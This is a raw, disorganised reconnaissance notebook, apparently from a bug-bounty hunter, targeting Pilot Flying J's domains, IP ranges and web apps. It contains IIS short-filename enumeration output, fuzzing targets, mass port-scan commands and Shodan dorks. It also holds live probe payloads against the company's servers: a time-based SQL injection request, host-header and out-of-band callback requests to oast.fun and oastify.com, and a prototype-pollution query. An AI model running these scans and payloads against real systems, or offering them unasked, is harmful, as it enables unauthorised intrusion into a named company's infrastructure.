+http://pilotflyingj.com/?utm_campaign=Driver View&utm_source=hs_automation&utm_medium=email&utm_content=13247573&_hsenc=p2ANqtz--8l-XJvpEhR8xwtAgfJQzbkOwVAefC9-FIi7QEqBmtkymre4MBltFdy10-IQCUJAronnCA20cjMMQ-ElOd5NWQ4oDXMA&_hsmi=13247573
+
+http://pilotflyingj.com/food?utm_campaign=Food+%26+Beverage&utm_source=hs_email&utm_medium=email&utm_content=16704398&_hsenc=p2ANqtz--HVsurUfHXFLZkUicpoqroC81_7lHywG0LEoKS5k9cSun6QUyA2cPFARdRJ5qWwuJoAAYBtgxL6W1dStMHjIdAP6Lkzg&_hsmi=16704398
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_content=8468452&utm_medium=social&utm_source=twitter
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_source=hs_email&utm_medium=email&utm_content=14289678&_hsenc=p2ANqtz--nzFH34ux9roEB3iBGKFL7YjmJVtMsST-P7IRqMh9z6LN8vPfmMGFePW0of0bZ6USstZSiJBteudMSWB7msmMeBA0wnw&_hsmi=14289678
+http://pilotflyingj.com/philmor?utm_source=redirect&utm_medium=redirect&utm_term=philmormug&utm_content=philmor&utm_campaign=myphilmordotcom/robots.txt
+http://reserve.pilotflyingj.com/Location/Details/1171?utm_source=Pilot&utm_medium=YextLocationsPages
+
+https://jobs.pilotflyingj.com/?utm_source=pilot&utm_medium=YextLocationsBlock&utm_campaign=recruitment
+
+https://locations.pilotflyingj.com/us/oh/toledo/5820-hagman-road?utm_source=Pilot&utm_medium=YextAlertBanner&utm_campaign=LaneClosures
+https://loyaltyportal.pilotflyingj.com/myrewards/confirmation?token=1V_tJgGvHMjbhDdZJZ2i0AFywOzVgo5RvJRxwNHxSnmB&_branch_match_id=1306343452090145625&utm_medium=marketing&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXL8jMyS9Jy6nMzEvP0kssKNDLyczL1g8N8cs2DM8MDA61L8nPTs2zNQyLL%2FFKdy%2Fz8M1KynBJifKKMso0cHSrLPevCkvPNw0q8wqqKPfzqAjOy3UCAKppM4FbAAAA
+
+
+
+https://www.pilotflyingj.com/fleet/?gclid=CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwE
+
+
+https://videorequests.pilotflyingj.com/servlet/servlet.ImageServer?id=0153c000004TP9N&oid=00D80000000bzL1&lastMod=1602444230000
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/bootstrap.js?aura.attributes=%7B%22ac%22%3A%22%22%2C%22authenticated%22%3A%22false%22%2C%22brandingSetId%22%3A%2293b8bb8e-a48f-4ca0-b591-b37ee1e27633%22%2C%22formFactor%22%3A%22LARGE%22%2C%22isHybrid%22%3A%22false%22%2C%22language%22%3A%22en_US%22%2C%22pageId%22%3A%220f5f1962-5c39-4a48-b964-2edf8b3068f3%22%2C%22publishedChangelistNum%22%3A%2231%22%2C%22schema%22%3A%22Published%22%2C%22themeLayoutType%22%3A%22Login%22%2C%22uds%22%3A%22false%22%2C%22viewType%22%3A%22Published%22%7D
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/resources.js?pv=1716476882000107833704&rv=1716613992000
+
+https://videorequests.pilotflyingj.com/s/login?ec=302&inst=8a&startURL=%2Fcontenthub%2F
+https://recover.pilotflyingj.com/showLogin.cc?constructor%5Bprototype%5D%5Ba42e5579%5D=yf2xy3x9&constructor.prototype.b1a3fd5b=yf2xy3x9&__proto__.ccd80966=yf2xy3x9&__proto__%5Bdcb52823%5D=yf2xy3x9
+
+
+
+
+https://privacy.pilotflyingj.com/s/sfsites/aura?r=2&aura.Component.getComponent=1&ui-communities-components-aura-components-forceCommunity-navigationMenu.NavigationMenuDataProvider.getNavigationMenu=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-force-components-controllers-hostConfig.HostConfig.getConfigData=1&ui-self-service-components-profileMenu.ProfileMenu.getProfileMenuResponse=1
+
+
+https://jobs.pilotflyingj.com/travel-center-jobs?custom_categories=Travel+Center+Jobs&location_city=Rawlins&location_state=Wyoming&page_number=1&page_size=50&sort_by=headline&sort_order=ASC
+http://blog.pilotflyingj.com/wp-json/swp_api/search?s=
+http://hubspot.pilotflyingj.com/travel-guide?portalId=339778&hsFormKey=12fdc54461cbe7a499d4479c41df20c3
+http://jobs.pilotflyingj.com/?debug=3e4edc5e4ade7278ed750502bde7eb65c16e037d
+http://jobs.pilotflyingj.com/ajax/click/track/insert/?FK1=5394107&EventID=9&EventData=&JobSource=
+
+
+
+
+https://loyaltyportal.pilotflyingj.com/myrewards/registration
+
+For this vulnerability, just type shodan title:"Check Point" ssl:"target"
+
+
+elati
+handru
+
+#5g/GGgd0xx
+
+samindunm
+
+
+#FU57/EVGss
+
+#FU57/EVGss
+
+
+
+TO_DO
+
+manual test main app
+
+with main app coockis try to acsees some 403 domains
+
+`
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+`
+https://click.newsletter.pilotflyingj.com/?qs=320d4bf731b62d67eb49c76ea88060e56a2cfd6ce4c00278c28ce93e5b3f05a14db028abb5b4b147c0b1236b64feb3d94ba43669b13c6a94
+
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx
+
+
+https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4
+
+
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/?qs=50ef32ecd79a805644f7feb734d1f28e464170b5e1f70fbf285650264b3b018ce1e8090fc9c8ea3a7eed468c895e84865ffd161c4cb70e8c
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=f1e6a4e46b0a9dbca914224fdb7b19ba40667d1cc939366bb2f93b963a965eaef6e80506142ec0381a9a8c03804a1f1d915914d873ab311b4341f727d3f9d13886ef400b9acd8918
+
+
+
+http://click.newsletter.pilotflyingj.com/open.aspx?d=70176&bmt=0
+
+http://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=f7715753beb0210a4811e1995f50acb935e7f8df86478b66a7149690c82621eafe6455935f0d8dd533ff90f72b45bcbfdb02788de9e80a1bdb8705580b2d42c3f5524e096585fd7f
+
+http://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=277ee25b29247cc61dc79736f775f0a3bcba4519a8afc4524f63ddbf1bd9758689731db0d5fc26228a9ef3127cb1d5b4e6adf3f5460e59cbfe42c6f554ce756283bec9178518f796
+
+http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4c
+
+
+
+
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4c
+
+
+
+
+work fine
+
+
+
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+
+https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4
+d
+AS14556	ASN	Pilot Travel Centers, LLC
+
+
+cidrs_
+
+65.196.143.0/24
+70.159.149.0/24
+74.114.188.0/24
+74.114.189.0/24
+74.114.190.0/24
+_
+
+
+Scope:
+
+*.pilottravelcenters.com
+*.pilotflyingj.com	
+*.rvpluscard.com
+*.pilotcloud.net	
+*.greenamericabiofuels.com	
+*.pilotcompany.com	
+*.saratogarack.com
+
+
+
+Customer Portal	
+Prime Parking
+com.pilottravelcenters.mypilot	Android.apk
+
+
+
+
+shodan_
+
+org:"Pilot Travel Centers  LLC"
+
+
+200 OK url 
+
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+
+
+_
+
+
+
+
+
+
+
+root@nsr3b:~# shortscan https://ids.rsga.pilotcloud.net
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+APP_TH~1             APP_TH?    
+WEB~1.CON            WEB.CON?   
+RESOUR~1             RESOUR?             .RESOURCES
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR~1.ASP          ERROR.ASP? 
+IDEASU~1.ASP         IDEASU?.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+REPORT~1.ASP         REPORT?.ASP?        REPORTVIEWERWEBFORM.ASPX
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT~2.ASP         REPORT?.ASP?        REPORTSTATUS.ASPX
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT_COPY%282%29.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 2052; Retries: 0; Sent 413496 bytes; Received 2800915 bytes
+
+https://ids.rsga.pilotcloud.net/EMPLOYEEMANAGEMENT.ASPX
+
+
+
+
+RL: https://east.ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+bAPP_TH~1             APP_TH?    
+WEB~1.CON            WEB.CON?   
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR~1.ASP          ERROR.ASP? 
+IDEASU~1.ASP         IDEASU?.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT~1.ASP         REPORT?.ASP?        REPORT_PROJECT_RESULT.ASPX
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+REPORT~2.ASP         REPORT?.ASP?        REPORT_WEB%20CONTROL%20DEPLOYMENT.ASPX
+RESOUR~1             RESOUR?             RESOURCETYPES
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT_NEW.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+RL: https://east.ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+bAPP_TH~1             APP_TH?    
+WEB~1.CON            WEB.CON?   
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR~1.ASP          ERROR.ASP? 
+IDEASU~1.ASP         IDEASU?.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT~1.ASP         REPORT?.ASP?        REPORT_PROJECT_RESULT.ASPX
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+REPORT~2.ASP         REPORT?.ASP?        REPORT_WEB%20CONTROL%20DEPLOYMENT.ASPX
+RESOUR~1             RESOUR?             RESOURCETYPES
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT_NEW.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+WEB~1.CON            WEB.CON?   
+APP_TH~1             APP_TH?    
+RESOUR~1             RESOUR?             .RESOURCES
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+IDEASU~1.ASP         IDEASU?.ASP? 
+ERROR~1.ASP          ERROR.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULTPOP.ASP
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEADDER.ASPX
+REPORT~1.ASP         REPORT?.ASP?        REPORTABSENCE.ASPX
+REPORT~2.ASP         REPORT?.ASP?        REPORTWEEK.ASPX
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTH-PULSE.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+TO_LOOK_MORE
+
+
+https://api.cp.pilotflyingj.com/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/FUZZ
+
+
+
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/blog?query=&
+X-Forwarded-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Forwarded-Server: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+
+
+
+* do google dork and github dork for urls
+
+
+
+
+swagger-api
+
+https://digital-qa-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-dev-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+
+
+
+do sub_brute
+
+
+
+*.rightangle.private.pilotcloud.net
+*.workflowengine-qa.trips.pilotcloud.net	
+
+
+
+https://74.114.188.161/ASPNET_CLIENT/system_web/2_0_50727/
+https://74.114.188.161/ASPNET_CLIENT/SYSTEM_WEB/4_0_30319/
+https://74.114.188.161/commonfiles/OFFLINeimages/APP_OFFLINE.HTM
+
+FUELPA~1             FUELPA?    
+FUELPR~1             FUELPR?    
+RATEPF~1             RATEPF?    
+WEB~1.CON            WEB.CON?   
+RETALI~1             RETALI?    
+EFORMS~1             EFORMS?    
+EVENTR~1             EVENTR?    
+RETAIL~1             RETAIL?    
+EXE13B~1             EXE13B?    
+EXB78E~1             EXB78E?    
+EXTRAN~1             EXTRAN?    
+EX4213~1             EX4213?    
+PFJDOC~1             PFJDOC?    
+PHILAN~1             PHILAN?    
+VENDOR~2             VENDOR?    
+BIODIE~1             BIODIE?    
+BLUEBE~1             BLUEBE?    
+FUELPA~4             FUELPA?    
+FUELPA~3             FUELPA?    
+FUELPA~2             FUELPA?    
+DFSRPR~1             DFSRPR?    
+VENDOR~1             VENDOR?    
+
+DOWN_F~1.JPG         DOWN_F?.JPG? 
+EMPLOY~1             EMPLOY?    
+SURVEY~1             SURVEY?    
+ASPNET~1             ASPNET?             https://74.114.188.161/aspnet_client
+COMMON~1             COMMON?             https://74.114.188.161/commonfiles
+EXTERN~3             EXTERN?    
+EXTERN~1             EXTERN?    
+EXTERN~2             EXTERN?    
+EXTERN~4             EXTERN?    
+
+https://74.114.188.161/VENDORApplication/
+https://74.114.188.161/VENDORportal/
+
+
+
+
+
+URL: https://74.114.188.161/SURVEYexternal/
+Running: Microsoft-IIS/7.5
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+ANSWER~1             ANSWER?    
+OOPS~1.ASP           OOPS.ASP?           OOPS.ASPX
+ANONYM~1.ASP         ANONYM?.ASP? 
+SURVEY~2.CSS         SURVEY?.CSS? 
+APP_OF~1.HTM         APP_OF?.HTM? 
+SURVEY~1.CSS         SURVEY?.CSS? 
+QUESTI~1.ASC         QUESTI?.ASC? 
+SURVEY~1.ASP         SURVEY?.ASP? 
+
+
+
+
+  |_ Identified directories: 1
+    |_ ANSWER~1
+  |_ Identified files: 8
+    |_ ANONYM~1.ASP
+    |_ APP_OF~1.HTM
+    |_ OOPS~1.ASP
+      |_ Actual file name = OOPS
+    |_ QUESTI~1.ASC
+    |_ SURVEY~1.ASP
+    |_ SURVEY~1.CSS
+    |_ SURVEY~2.CSS
+    |_ WEB~1.CON
+
+
+
+
+
+
+
+
+https://74.114.188.161/SURVEYexternal/OOPS.ASPX
+
+
+
+  |_ Identified directories: 29
+    |_ ASPNET~1
+    |_ BIODIE~1
+    |_ BLUEBE~1
+    |_ COMMON~1
+    |_ DFSRPR~1
+    |_ EFORMS~1
+    |_ EMPLOY~1
+    |_ EVENTR~1
+    |_ EX4213~1
+    |_ EXB78E~1
+    |_ EXE13B~1
+    |_ EXTERN~1
+    |_ EXTERN~2
+    |_ EXTERN~3
+    |_ EXTERN~4
+    |_ EXTRAN~1
+    |_ FUELPA~1
+    |_ FUELPA~2
+    |_ FUELPA~3
+    |_ FUELPA~4
+    |_ FUELPR~1
+    |_ PFJDOC~1
+    |_ PHILAN~1
+    |_ RATEPF~1
+    |_ RETAIL~1
+    |_ RETALI~1
+    |_ SURVEY~1
+    |_ VENDOR~1
+    |_ VENDOR~2
+
+https://74.114.188.161/VENDORportal/PROPERTIES/DATASOURCES/SYSTEMS.DAT
+
+
+
+
+GET /pfj-loyaltymkt-one9-website-e'(select*from(select(sleep(20)))a)'/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+https://fuel.pilottravelcenters.com/
+
+                            PEGASU~1.20
+                            PEGASU~1.202
+try to find this file by ffufing
+
+/Pegasus2%20Sentinel2/
+/Pegasus2
+/PEGASUS_
+/10.20.202
+
+
+ffuf with _ and .
+
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/2_0_50727/
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/4_0_30319/
+
+
+https://github.com/dwyl/english-words
+
+
+p/App_Scripts/MicrosoftAjax.js
+p/App_Scripts/wacairspaceanimationlibrary.js
+App_Scripts/MicrosoftAjax.js
+App_Scripts/wacairspaceanimationlibrary.js
+MicrosoftAjax.js
+wacairspaceanimationlibrary.js
+
+
+
+more 
+
+https://officeonline.pilottravelcenters.com/p/RESOURCES/
+
+
+google chatgpt github twiteer
+
+
+
+URL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.XAP         MICROS?.XAP? 
+MICROS~2.XAP         MICROS?.XAP? 
+
+
+https://officeonline.pilottravelcenters.com/p/
+
+ |_ Identified directories: 8
+    |_ APP_BR~1
+    |_ APP_SC~1 app_scripts
+    |_ CLIENT~1 clientbin
+    |_ PPTRES~1 pptresources
+    |_ PPTSCR~1 pptscripts
+    |_ PPTSTA~1
+    |_ PPTTEM~1
+    |_ RESOUR~1 resources
+
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/backup/
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/
+
+https://extranet.pilottravelcenters.com/VendorPortal/WebResource.axd?d=2D8um6hCzDf4buMyKAP_QMDhhEhf_2v75GtGSg0dHLcwy55GumzsWQPvpc0WwQaFE9LmBBQaBubaMliD6IgZI6pyD63AU39wEojaauSWwxM1bt7qu'-ffuf-'j3wrr&t=637811441240000000
+
+
+
+
+
+
+
+if somebody says that something is impossible and it's not buypassible we are hackers and we always find a path to do things
+
+These blackbox regular expression testing is still not very touched I keep finding all these issues when I go to live hacking events it's it's always there
+
+If something is being validated and you can bypass it think about the impact and you'll see the big picture
+
+
+
+"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
+
+
+
+
+Buypass methids
+
+
+
+https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
+
+
+
+
+
+34 M Wordlist Subdomain Brute-Force
+Full Subdomain Enumeration
+Levels-deep Subdomain Enumeration
+
+
+Allforone
+reconftw.sh
+awscert.sh
+
+
+
+
+
+
+http://nationalpizzamonth.pilotflyingj.com/
+
+
+
+
+
+Frist Target  74.114.190.0/24  aalias 5_cidr
+
+74.114.190.25    test-okcvpn.pilotflyingj.com.
+74.114.190.214   mail12.pilottravelcenters.com.
+74.114.190.248   dns3.pilotcorp.com.
+74.114.190.249   dns4.pilotcorp.com.
+
+74.114.190.89:443  Citrix Gateway
+https://74.114.190.89/logon/LogonPoint/tmindex.html
+
+Citrix Gateway
+haw to find vershion https://github.com/fox-it/citrix-netscaler-triage
+look for do file on linkfindr on burp open all js file
+
+https://74.114.190.89/nf/auth/doNegotiate.do
+
+-------------------------------------------------------------------------------
+
+Second Target 74.114.189.0/24
+
+prips 74.114.189.0/24 |  hakrevdns
+
+74.114.189.55    as2.pilottravelcenters.com.
+74.114.189.73    mobileapps.pilotflyingj.com.
+74.114.189.73    pilot-flyingj.com.
+74.114.189.73    www.pilot-flyingj.com.
+74.114.189.73    reserve.pilotflyingj.com.
+74.114.189.73    myrewards-qa.pilotflyingj.com.
+74.114.189.73    pilottravelcenters-qa.pilotflyingj.com.
+74.114.189.73    www.pilotsurveys.com.
+74.114.189.73    pilotsurveys.com.
+74.114.189.73    www.pfjfeedback.com.
+74.114.189.73    pfjfeedback.com.
+74.114.189.73    portal-test.pilotflyingj.com.
+74.114.189.86    extranet.pilotflyingj.com.
+74.114.189.130   travelwell.pilotflyingj.com.
+74.114.189.130   rebateeducation.pilotflyingj.com.
+74.114.189.130   www.rebateeducation.pilotflyingj.com.
+74.114.189.150   connect4.pilottravelcenters.com.
+74.114.189.250   connect2.pilottravelcenters.com.
+
+
+shodan.
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+www.pilotsurveys.com
+myrewards-qa.pilotflyingj.com
+pilotflyingj.com
+portal-test.pilotflyingj.com
+
+74.114.189.130
+travelwell.pilotflyingj.com
+rebateeducation.pilotflyingj.com
+www.rebateeducation.pilotflyingj.com
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+pilot-flyingj.com
+www.pilot-flyingj.com
+reserve.pilotflyingj.com
+myrewards-qa.pilotflyingj.com
+
+74.114.189.55
+as2.pilottravelcenters.com
+
+
+
+
+naabu -host 74.114.189.0/24  -top-ports 1000
+
+74.114.189.73:443
+74.114.189.55:5080
+74.114.189.130:80
+74.114.189.130:443
+74.114.189.73:80
+74.114.189.55:443
+
+masscan 74.114.189.0/24 --ports 0-65535 --rate=100000 -oX 4_cidr_massful.xml
+
+
+
+
+
+
+
+
+
+
+GET http://7ea135aefd204f3b87-ke2revwibc6msuregzkqh8b5owumib.oastify.com HTTP/1.1
+Host: loyaltyportal.pilotflyingj.com
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+
+
+http://myrewards.pilotflyingj.com/?utm_source=landing%20page&utm_medium=landing%20page&utm_campaign=shower%20power
+http://nationalpizzamonth.pilotflyingj.com/?amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_source=Facebook&amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+
+http://pilotflyingj.com/?utm_campaign=Driver View&utm_source=hs_automation&utm_medium=email&utm_content=13247573&_hsenc=p2ANqtz--8l-XJvpEhR8xwtAgfJQzbkOwVAefC9-FIi7QEqBmtkymre4MBltFdy10-IQCUJAronnCA20cjMMQ-ElOd5NWQ4oDXMA&_hsmi=13247573
+
+http://pilotflyingj.com/food?utm_campaign=Food+%26+Beverage&utm_source=hs_email&utm_medium=email&utm_content=16704398&_hsenc=p2ANqtz--HVsurUfHXFLZkUicpoqroC81_7lHywG0LEoKS5k9cSun6QUyA2cPFARdRJ5qWwuJoAAYBtgxL6W1dStMHjIdAP6Lkzg&_hsmi=16704398
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_content=8468452&utm_medium=social&utm_source=twitter
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_source=hs_email&utm_medium=email&utm_content=14289678&_hsenc=p2ANqtz--nzFH34ux9roEB3iBGKFL7YjmJVtMsST-P7IRqMh9z6LN8vPfmMGFePW0of0bZ6USstZSiJBteudMSWB7msmMeBA0wnw&_hsmi=14289678
+http://pilotflyingj.com/philmor?utm_source=redirect&utm_medium=redirect&utm_term=philmormug&utm_content=philmor&utm_campaign=myphilmordotcom/robots.txt
+http://reserve.pilotflyingj.com/Location/Details/1171?utm_source=Pilot&utm_medium=YextLocationsPages
+
